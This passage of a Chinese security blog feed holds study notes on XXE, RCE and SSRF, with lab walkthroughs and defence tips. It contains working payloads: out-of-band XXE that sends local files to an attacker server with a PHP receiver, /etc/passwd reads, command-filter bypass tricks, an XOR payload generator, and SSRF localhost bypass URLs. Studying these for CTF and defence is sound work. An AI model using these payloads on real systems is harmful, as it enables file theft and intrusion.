class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;data://text/plain;base64,Y2w0eV9uZWVkX2FfZ3JpbGZyaWVuZA==&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure><h1 id="实例演示"><a href="#实例演示" class="headerlink" title="实例演示"></a>实例演示</h1><h2 id="实例一"><a href="#实例一" class="headerlink" title="实例一"></a>实例一</h2><p>靶场：<a href="https://github.com/c0ny1/xxe-lab">https://github.com/c0ny1/xxe-lab</a></p><p><img src="/../images/Pasted%20image%2020241209172520.png"></p><p>登录抓包。发现数据类型是xml，测试有无XXE漏洞。</p><p><img src="/../images/Pasted%20image%2020241209172755.png"></p><p>此时要利用XXE漏洞执行文件读取操作，分两种情况，分别是有回显和无回显。</p><h3 id="有回显"><a href="#有回显" class="headerlink" title="有回显"></a>有回显</h3><p>恶意引入外部实体:</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">xxshh</span> [ </span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">test</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///c:/1.txt&quot;</span>&gt;</span> </span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span><span class="hljs-symbol">&amp;test;</span><span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>123<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span> <br></code></pre></td></tr></table></figure><p>成功读取1.txt。</p><p><img src="/../images/Pasted%20image%2020241209213049.png"></p><p>这里尝试了很久一直报错，更改了php版本，修改了php.ini，均失败。最后发现是新建文本文件的时候将文件命名为1.txt，导致最终文件名是1.txt.txt。</p><p><img src="/../images/b59768d9d0f6a4e67fa7e0f4fbb0c6de.png"></p><h3 id="无回显"><a href="#无回显" class="headerlink" title="无回显"></a>无回显</h3><ol><li><strong>带外查询判断是否有XXE漏洞。</strong></li></ol><p><strong>（1） DNSLog</strong></p><p>payload:</p><figure class="highlight mojolicious"><table><tr><td class="code"><pre><code class="hljs mojolicious"><span class="language-xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> ?&gt;</span></span><br><span class="language-xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">test</span> [</span></span><br><span class="hljs-meta"><span class="language-xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">file</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;http://bqtwb9.dnslog.cn&quot;</span>&gt;</span></span></span><br><span class="hljs-meta"><span class="language-xml"></span></span><span class="language-perl"><span class="hljs-variable">%file</span>; </span><span class="language-xml"><span class="hljs-meta"></span></span><br><span class="hljs-meta"><span class="language-xml">]&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span><span class="hljs-symbol">&amp;send;</span><span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>123<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span></span><br></code></pre></td></tr></table></figure><p><img src="/../images/Pasted%20image%2020241209223504.png"></p><p>有解析记录证明存在XXE漏洞：<br><img src="/../images/Pasted%20image%2020241209223518.png"></p><p><strong>（2）反向连接</strong></p><p><img src="/../images/Pasted%20image%2020241209224132.png"></p><p><img src="/../images/Pasted%20image%2020241209224225.png"></p><ol start="2"><li><strong>引用外部参数实体</strong></li></ol><p>payload：</p><figure class="highlight mojolicious"><table><tr><td class="code"><pre><code class="hljs mojolicious"><span class="language-xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="language-xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">ANY</span>[</span></span><br><span class="hljs-meta"><span class="language-xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">file</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///c:/1.txt&quot;</span>&gt;</span></span></span><br><span class="hljs-meta"><span class="language-xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">remote</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;http://192.168.46.132/test.dtd&quot;</span>&gt;</span></span></span><br><span class="hljs-meta"><span class="language-xml"></span></span><span class="language-perl"><span class="hljs-variable">%remote</span>;</span><span class="language-xml"><span class="hljs-meta"></span></span><br><span class="hljs-meta"><span class="language-xml"></span></span><span class="language-perl"><span class="hljs-variable">%all</span>;</span><span class="language-xml"><span class="hljs-meta"></span></span><br><span class="hljs-meta"><span class="language-xml">]&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">root</span>&gt;</span><span class="hljs-symbol">&amp;send;</span><span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span></span><br></code></pre></td></tr></table></figure><p><img src="/../images/Pasted%20image%2020241210110542.png"></p><p>远程服务器上放两个文件：</p><p>test.dtd:</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">all</span> <span class="hljs-string">&quot;&lt;!ENTITY send SYSTEM &#x27;http://192.168.46.132/get.php?file=%file;&#x27;&gt;&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure><p>get.http（接收file参数，并将读到的内容写入file.txt):</p><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$data</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br><br><span class="hljs-variable">$myfile</span> = <span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&quot;file.txt&quot;</span>, <span class="hljs-string">&quot;w+&quot;</span>);<br><br><span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$myfile</span>, <span class="hljs-variable">$data</span>);<br><br><span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$myfile</span>);<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>发送请求之后，远程服务器上出现file.txt，利用成功XEE漏洞读取文件。</p><p><img src="/../images/Pasted%20image%2020241210110809.png"></p><p>这里发现1.txt有空格的话就无法成功，原因是接收file参数的时候不能有空格，这种情况可以结合php:&#x2F;&#x2F;filter伪协议使用，然后解码。</p><p><img src="/../images/Pasted%20image%2020241210112236.png"></p><p>分析以上流程：</p><ul><li>payload定义了一个 外部实体 (<code>file</code>)，指向本地文件系统路径 <code>c://1.txt</code>.</li><li>同时又定义了一个 外部实体 (<code>remote</code>)，指向远程 URL <code>http://192.168.46.132/test.dtd</code>。</li><li>触发了 <code>remote</code> 实体的解析，导致远程加载 <code>test.dtd</code> 的内容。</li><li><code>&amp;send;</code> 引用了 <code>test.dtd</code> 文件中定义的一个实体。</li><li><code>test.dtd</code> 定义了一个外部实体 <code>send</code>，它的值是上述远程 URL，这个 URL 包含参数 <code>file=%file;</code>，其中 <code>%file;</code> 是在原始 <code>DTD</code> 中定义的本地文件路径。URL变为：</li></ul><figure class="highlight livecodeserver"><table><tr><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-keyword">http</span>://<span class="hljs-number">192.168</span><span class="hljs-number">.46</span><span class="hljs-number">.132</span>/<span class="hljs-built_in">get</span>.php?<span class="hljs-built_in">file</span>=<span class="hljs-built_in">file</span>:<span class="hljs-comment">///c:/1.txt</span><br></code></pre></td></tr></table></figure><ul><li>当外部实体 <code>send</code> 被解析时，解析器会尝试访问该 URL，并将<code>c:/1.txt</code> 的内容发送给攻击者的服务器，写入file.txt。</li></ul><h2 id="实例二"><a href="#实例二" class="headerlink" title="实例二"></a>实例二</h2><p>靶场：<a href="http://web.jarvisoj.com:9882/">http://web.jarvisoj.com:9882/</a></p><p>抓包发现数据类型是json：<br><img src="/../images/Pasted%20image%2020241210113651.png"></p><p>尝试更改数据格式：</p><figure class="highlight pgsql"><table><tr><td class="code"><pre><code class="hljs pgsql">Content-<span class="hljs-keyword">Type</span>: application/<span class="hljs-type">xml</span><br></code></pre></td></tr></table></figure><p>引入外部实体尝试读取 etc&#x2F;passwd:</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version = <span class="hljs-string">&quot;1.0&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">ANY</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY f <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">x</span>&gt;</span><span class="hljs-symbol">&amp;f;</span><span class="hljs-tag">&lt;/<span class="hljs-name">x</span>&gt;</span><br></code></pre></td></tr></table></figure><p>成功读取：</p><p><img src="/../images/Pasted%20image%2020241210114158.png"></p><blockquote><p>[!NOTE] 总结</p><ul><li>当发现Content-Type 为 xml 时，就应想到 XXE 注入。</li><li>不管Content-Type是什么，均可尝试修改后测试 XXE。</li></ul></blockquote><h1 id="XXE防御"><a href="#XXE防御" class="headerlink" title="XXE防御"></a>XXE防御</h1><ol><li><strong>禁用外部实体</strong></li></ol><figure class="highlight routeros"><table><tr><td class="code"><pre><code class="hljs routeros">PHP:<br>libxml_disable_entity_loader(<span class="hljs-literal">true</span>);<br><br>JAVA:<br>DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();dbf.setExpandEntityReferences(<span class="hljs-literal">false</span>);<br><br>Python：<br><span class="hljs-keyword">from</span> lxml import etreexmlData = etree.parse(xmlSource,etree.XMLParser(<span class="hljs-attribute">resolve_entities</span>=<span class="hljs-literal">False</span>))<br></code></pre></td></tr></table></figure><ol start="2"><li><strong>过滤用户提交的 XML 数据</strong></li></ol><figure class="highlight erlang-repl"><table><tr><td class="code"><pre><code class="hljs erlang-repl">过滤关键词：&lt;!DOCTYPE和&lt;!ENTITY，**或者SYSTEM和PUBLIC**<br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;原理&quot;&gt;&lt;a href=&quot;#原理&quot; class=&quot;headerlink&quot; title=&quot;原理&quot;&gt;&lt;/a&gt;原理&lt;/h1&gt;&lt;p&gt;XXE (XML External Entity Injection)，即 XML 外部实体注入漏洞。XXE 漏洞发生在应用程序解析 XML</summary>
      
    
    
    
    
    <category term="WEB" scheme="http://example.com/tags/WEB/"/>
    
  </entry>
  
  <entry>
    <title>RCE漏洞</title>
    <link href="http://example.com/2024/12/09/RCE%E6%BC%8F%E6%B4%9E/"/>
    <id>http://example.com/2024/12/09/RCE%E6%BC%8F%E6%B4%9E/</id>
    <published>2024-12-09T01:42:48.000Z</published>
    <updated>2024-12-11T11:10:16.960Z</updated>
    
    <content type="html"><![CDATA[<h1 id="常见RCE漏洞函数"><a href="#常见RCE漏洞函数" class="headerlink" title="常见RCE漏洞函数"></a>常见RCE漏洞函数</h1><ul><li><p><strong>PHP</strong></p><ul><li><p><strong>代码执行</strong>函数：eval(), assert(), preg_replace(), create_function(), array_map(), call_user_func(), call_user_func_array(), array_filter(), uasort()等。</p></li><li><p><strong>命令执行</strong>函数：system(), exec(), shell_exec(), pcntl_exec(), popen(), proc_popen, passthru()等。</p></li><li><p>两者可以相互转换，如代码执行传入 system (ls) 转化为命令执行；命令执行也可以转化为代码执行 (如使用 php 或 python 环境变量执行代码)</p></li></ul></li><li><p><strong>Python</strong></p><ul><li>eval, exec, subprocess, os.system, commands</li></ul></li><li><p><strong>Java</strong></p><ul><li>Java中没有类似php中eval函数这种直接可以将字符串转化为代码执行的函数，但是有反射机制，并且有各种基于反射机制的表达式引擎，如: OGNL、SpEL、MVEL等。</li></ul></li></ul><h1 id="关键字过滤绕过"><a href="#关键字过滤绕过" class="headerlink" title="关键字过滤绕过"></a>关键字过滤绕过</h1><ol><li><strong>通配符</strong></li></ol><figure class="highlight gams"><table><tr><td class="code"><pre><code class="hljs gams"><span class="hljs-comment">*：代表一个或多个字符。</span><br>？：代表任意 <span class="hljs-number">1</span> 个字符。<br></code></pre></td></tr></table></figure><p><img src="/../images/Pasted%20image%2020241209133000.png"></p><ol start="2"><li><strong>转义符号</strong></li></ol><p><img src="/../images/Pasted%20image%2020241209133118.png"></p><ol start="3"><li><strong>空变量</strong></li></ol><figure class="highlight crystal"><table><tr><td class="code"><pre><code class="hljs crystal">如<span class="hljs-variable">$*</span>, <span class="hljs-variable">$@</span>, <span class="hljs-variable">$x</span>,<span class="hljs-variable">$&#123;</span>x&#125;，因为没有变量没有定义，所以相当于空变量<br></code></pre></td></tr></table></figure><p><img src="/../images/Pasted%20image%2020241209133558.png"></p><ol start="4"><li><strong>拼接法</strong></li></ol><p><img src="/../images/Pasted%20image%2020241209133921.png"></p><ol start="5"><li><strong>反引号</strong></li></ol><figure class="highlight stata"><table><tr><td class="code"><pre><code class="hljs stata">Linux会先执行被反引号包裹的内容。<br><br><span class="hljs-keyword">cat</span> `<span class="hljs-keyword">ls</span>`   # 如此处先执行<span class="hljs-keyword">ls</span>返回flag,然后语句就拼接成为 <span class="hljs-keyword">cat</span> flag<br></code></pre></td></tr></table></figure><ol start="6"><li><strong>编码</strong></li></ol><ul><li>将关键字进行编码，传入命令时，解码为我们需要的值。</li></ul><p><img src="/../images/Pasted%20image%2020241209135310.png"></p><ol start="7"><li><strong>组合绝活</strong></li></ol><figure class="highlight vim"><table><tr><td class="code"><pre><code class="hljs vim">touch <span class="hljs-string">&quot;ag&quot;</span><br>touch <span class="hljs-string">&quot;fl\\&quot;</span><br>touch <span class="hljs-string">&quot;t \\&quot;</span><br>touch <span class="hljs-string">&quot;ca\\&quot;</span><br><span class="hljs-keyword">ls</span> -t &gt;<span class="hljs-keyword">shell</span><br><span class="hljs-keyword">sh</span> <span class="hljs-keyword">shell</span><br><br>// \ 指的是换行<br>// <span class="hljs-keyword">ls</span> -t 是将文本按时间排序输出<br>// <span class="hljs-keyword">ls</span> -t &gt;<span class="hljs-keyword">shell</span> 将输出输入到 <span class="hljs-keyword">shell</span> 文件中<br>// <span class="hljs-keyword">sh</span> 将文本中的文字读取出来执行, 虽然有报错，但是<span class="hljs-keyword">shell</span>命令还是会进行执行<br></code></pre></td></tr></table></figure><ol start="8"><li><strong>rce-xor（重点）</strong></li></ol><p>如有下面这样一个 php 过滤页面：</p><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>); <span class="hljs-comment">// 不报错,不显示任何报错</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$code</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;code&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[a-z0-9]/i&#x27;</span>,<span class="hljs-variable">$code</span>))&#123;   <span class="hljs-comment">// 过滤所有字母和数字</span><br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;hacker&#x27;</span>);<br>&#125;<br><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$code</span>);<br></code></pre></td></tr></table></figure><p>过滤了所有字母和数字，这种情况可以使用异或脚本绕过：</p><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//rce-xor.php</span><br><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$myfile</span> = <span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&quot;res.txt&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>);<br><span class="hljs-variable">$contents</span>=<span class="hljs-string">&quot;&quot;</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-number">256</span>; <span class="hljs-variable">$i</span>++) &#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-variable">$j</span>=<span class="hljs-number">0</span>; <span class="hljs-variable">$j</span> &lt;<span class="hljs-number">256</span> ; <span class="hljs-variable">$j</span>++) &#123;<br><br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$i</span>&lt;<span class="hljs-number">16</span>)&#123;<br>            <span class="hljs-variable">$hex_i</span>=<span class="hljs-string">&#x27;0&#x27;</span>.<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$i</span>);<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-variable">$hex_i</span>=<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$i</span>);<br>        &#125;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$j</span>&lt;<span class="hljs-number">16</span>)&#123;<br>            <span class="hljs-variable">$hex_j</span>=<span class="hljs-string">&#x27;0&#x27;</span>.<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$j</span>);<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-variable">$hex_j</span>=<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$j</span>);<br>        &#125;<br>        <span class="hljs-variable">$preg</span> = <span class="hljs-string">&#x27;/[a-z0-9]/i&#x27;</span>; <span class="hljs-comment">//根据题目给的正则表达式修改即可</span><br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-variable">$preg</span> , <span class="hljs-title function_ invoke__">hex2bin</span>(<span class="hljs-variable">$hex_i</span>))||<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-variable">$preg</span> , <span class="hljs-title function_ invoke__">hex2bin</span>(<span class="hljs-variable">$hex_j</span>)))&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&quot;</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-variable">$a</span>=<span class="hljs-string">&#x27;%&#x27;</span>.<span class="hljs-variable">$hex_i</span>;<br>            <span class="hljs-variable">$b</span>=<span class="hljs-string">&#x27;%&#x27;</span>.<span class="hljs-variable">$hex_j</span>;<br>            <span class="hljs-variable">$c</span>=(<span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$a</span>)^<span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$b</span>));<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$c</span>)&gt;=<span class="hljs-number">32</span>&amp;<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$c</span>)&lt;=<span class="hljs-number">126</span>) &#123;<br>                <span class="hljs-variable">$contents</span>=<span class="hljs-variable">$contents</span>.<span class="hljs-variable">$c</span>.<span class="hljs-string">&quot; &quot;</span>.<span class="hljs-variable">$a</span>.<span class="hljs-string">&quot; &quot;</span>.<span class="hljs-variable">$b</span>.<span class="hljs-string">&quot;\n&quot;</span>;<br>            &#125;<br>        &#125;<br><br>    &#125;<br>&#125;<br><span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$myfile</span>,<span class="hljs-variable">$contents</span>);<br><span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$myfile</span>);<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">//rce-xor.py<br><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> urllib<br><span class="hljs-keyword">from</span> sys <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> os<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">action</span>(<span class="hljs-params">arg</span>):<br>    s1 = <span class="hljs-string">&quot;&quot;</span><br>    s2 = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> arg:<br>        f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;res.txt&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>)<br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            t = f.readline()<br>            <span class="hljs-keyword">if</span> t == <span class="hljs-string">&quot;&quot;</span>:<br>                <span class="hljs-keyword">break</span><br>            <span class="hljs-keyword">if</span> t[<span class="hljs-number">0</span>] == i:<br>                <span class="hljs-comment"># print(i)</span><br>                s1 += t[<span class="hljs-number">2</span>:<span class="hljs-number">5</span>]<br>                s2 += t[<span class="hljs-number">6</span>:<span class="hljs-number">9</span>]<br>                <span class="hljs-keyword">break</span><br>        f.close()<br>    output = <span class="hljs-string">&quot;(\&quot;&quot;</span> + s1 + <span class="hljs-string">&quot;\&quot;^\&quot;&quot;</span> + s2 + <span class="hljs-string">&quot;\&quot;)&quot;</span><br>    <span class="hljs-keyword">return</span> (output)<br><br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    param = action(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;\n[+] your function：&quot;</span>)) + action(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;[+] your command：&quot;</span>)) + <span class="hljs-string">&quot;;&quot;</span><br>    <span class="hljs-built_in">print</span>(param)<br></code></pre></td></tr></table></figure><p>使用时先根据题目的正则修改 php 中的正则表达式，将运行后生成的 txt 文件放置到对应 py 文件的目录下，运行 py 文件来生成自己想要执行的函数和命令。将生成的 payload 传入接收参数的变量 code。</p><ol start="9"><li><strong>命令关键词被过滤（如 cat tac 等）</strong></li></ol><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">more:一页一页的显示档案内容<br>less:与 more 类似<br><span class="hljs-built_in">head</span>:查看头几行<br><span class="hljs-built_in">tac</span>:从最后一行开始显示，可以看出 <span class="hljs-built_in">tac</span> 是 <span class="hljs-built_in">cat</span> 的反向显示<br><span class="hljs-built_in">tail</span>:查看尾几行<br><span class="hljs-built_in">nl</span>：显示的时候，顺便输出行号<br><span class="hljs-built_in">od</span>:以二进制的方式读取档案内容<br>vi:一种编辑器<br>vim:一种编辑器<br><span class="hljs-built_in">sort</span>:可以查看<br><span class="hljs-built_in">uniq</span>:可以查看<br>file -f:报错出具体内容<br>sh /flag 2&gt;%261 //报错出文件内容<br>curl file:///root/f/flag 使用file伪协议读取本地文件<br>strings flag <br><span class="hljs-built_in">uniq</span> -c flag<br>bash -v flag<br>rev flag<br></code></pre></td></tr></table></figure><ol start="10"><li><strong>空格被过滤</strong></li></ol><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">%09（url传递）(<span class="hljs-built_in">cat</span>%09flag.php)<br><span class="hljs-built_in">cat</span><span class="hljs-variable">$&#123;IFS&#125;</span>flag<br>&#123;<span class="hljs-built_in">cat</span>,flag&#125;  //&#123;commond,arg&#125;，第一个参数为要执行的命令，后面的参数是传入命令的参数<br></code></pre></td></tr></table></figure><ol start="11"><li><strong>参数逃逸</strong></li></ol><figure class="highlight mel"><table><tr><td class="code"><pre><code class="hljs mel"><span class="hljs-keyword">eval</span>($_GET[<span class="hljs-number">1</span>]);&amp;<span class="hljs-number">1</span>=<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;tac flag.php&#x27;</span>);<br></code></pre></td></tr></table></figure><ol start="12"><li><strong>搭配文件包含和伪协议</strong></li></ol><figure class="highlight php-template"><table><tr><td class="code"><pre><code class="hljs php-template"><span class="language-xml">include $_GET[a]?&gt;&amp;a=data://text/plain,</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;ver&#x27;</span>);<span class="hljs-meta">?&gt;</span></span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml">include $_GET[a]?&gt;&amp;a=php://filter/read=convert.base64-encode/resource=index.php</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;常见RCE漏洞函数&quot;&gt;&lt;a href=&quot;#常见RCE漏洞函数&quot; class=&quot;headerlink&quot; title=&quot;常见RCE漏洞函数&quot;&gt;&lt;/a&gt;常见RCE漏洞函数&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;PHP&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li</summary>
      
    
    
    
    
    <category term="WEB" scheme="http://example.com/tags/WEB/"/>
    
  </entry>
  
  <entry>
    <title>SSRF漏洞</title>
    <link href="http://example.com/2024/12/08/SSRF%E6%BC%8F%E6%B4%9E/"/>
    <id>http://example.com/2024/12/08/SSRF%E6%BC%8F%E6%B4%9E/</id>
    <published>2024-12-08T10:42:29.000Z</published>
    <updated>2024-12-09T08:33:43.659Z</updated>
    
    <content type="html"><![CDATA[<h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>SSRF (Server-Side Request Forgery: 服务器端请求伪造) 一种由攻击者构造形成由服务端发起请求的一个安全漏洞；</p><p>一般情况下，SSRF 攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）</p><p>SSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。</p><h1 id="协议利用"><a href="#协议利用" class="headerlink" title="协议利用"></a>协议利用</h1><figure class="highlight dts"><table><tr><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">http:</span><span class="hljs-comment">//  Web常见访问，如http://127.0.0.1</span><br><span class="hljs-symbol"></span><br><span class="hljs-symbol">file:</span><span class="hljs-comment">// 从文件系统中获取文件内容，如，file://etc/passwd</span><br><span class="hljs-symbol"></span><br><span class="hljs-symbol">dict:</span><span class="hljs-comment">// 字典服务器协议，访问字典资源，如，dict://ip:6739/info：</span><br><span class="hljs-symbol"></span><br><span class="hljs-symbol">sftp:</span><span class="hljs-comment">// SSH文件传输协议或安全文件传输协议</span><br><span class="hljs-symbol"></span><br><span class="hljs-symbol">ldap:</span><span class="hljs-comment">// 轻量级目录访问协议</span><br><span class="hljs-symbol"></span><br><span class="hljs-symbol">tftp:</span><span class="hljs-comment">// 简单文件传输协议</span><br><span class="hljs-symbol"></span><br><span class="hljs-symbol">gopher:</span><span class="hljs-comment">// 分布式文档传递服务，可使用gopherus生成payload。由于有部分协议http这类不支持，可以gopher来进行通讯（mysql，redis等）</span><br></code></pre></td></tr></table></figure><h1 id="漏洞防御"><a href="#漏洞防御" class="headerlink" title="漏洞防御"></a>漏洞防御</h1><ul><li>过滤返回信息，验证远程服务器对请求的响应。</li><li>统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态。</li><li>限制请求的端口为 http 常用的端口，比如，80,443,8080,8090。</li><li>黑名单内网 ip。避免应用被用来获取获取内网数据，攻击内网。</li><li>禁用不需要的协议。仅仅允许 http 和 https 请求。可以防止类似于 file:&#x2F;&#x2F;, gopher:&#x2F;&#x2F;, ftp:&#x2F;&#x2F; 等引起的问题。</li></ul><h1 id="白盒绕过"><a href="#白盒绕过" class="headerlink" title="白盒绕过"></a>白盒绕过</h1><ol><li>无过滤直接获取<br><img src="/../images/Pasted%20image%2020241208210216.png"></li></ol><p>payload：</p><figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk">url=http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>/flag.php<br>url=file:<span class="hljs-regexp">//</span><span class="hljs-regexp">/var/</span>www<span class="hljs-regexp">/html/</span>flag.php<br></code></pre></td></tr></table></figure><ol start="2"><li>IP地址进制绕过</li></ol><p>正则过滤规则 &#x2F;localhost|127.0.|。&#x2F;i</p><p>payload:</p><figure class="highlight qml"><table><tr><td class="code"><pre><code class="hljs qml">十六进制<br>    <span class="hljs-built_in">url</span>=<span class="hljs-attribute">http</span>:<span class="hljs-comment">//0x7F.0.0.1/flag.php</span><br>八进制<br>    <span class="hljs-built_in">url</span>=<span class="hljs-attribute">http</span>:<span class="hljs-comment">//0177.0.0.1/flag.php</span><br><span class="hljs-number">10</span> 进制整数格式<br>    <span class="hljs-built_in">url</span>=<span class="hljs-attribute">http</span>:<span class="hljs-comment">//2130706433/flag.php</span><br><span class="hljs-number">16</span> 进制整数格式，还是上面那个网站转换记得前缀<span class="hljs-number">0</span>x<br>    <span class="hljs-built_in">url</span>=<span class="hljs-attribute">http</span>:<span class="hljs-comment">//0x7F000001/flag.php</span><br>还有一种特殊的省略模式<br>    <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>写成<span class="hljs-number">127.1</span><br>用CIDR绕过localhost<br>    <span class="hljs-built_in">url</span>=<span class="hljs-attribute">http</span>:<span class="hljs-comment">//127.127.127.127/flag.php</span><br>还有很多方式<br>    <span class="hljs-built_in">url</span>=<span class="hljs-attribute">http</span>:<span class="hljs-comment">//0/flag.php</span><br>    <span class="hljs-built_in">url</span>=<span class="hljs-attribute">http</span>:<span 